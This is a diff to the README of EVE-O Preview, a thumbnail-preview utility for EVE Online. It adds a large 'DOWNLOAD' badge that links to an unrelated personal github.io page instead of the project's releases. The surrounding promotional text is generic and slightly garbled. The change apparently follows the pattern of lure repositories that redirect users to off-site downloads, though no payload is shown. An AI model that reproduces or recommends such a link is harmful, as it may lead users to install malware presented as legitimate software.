@@ -30,6 +30,12 @@ EVE-O Preview gives EVE Online players thumbnail previews of all running game cl
 
 Whether you're a newcomer or a veteran, EVE-O Preview provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download EVE-O Preview](https://img.shields.io/badge/⬇_DOWNLOAD_EVE+O+Preview-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
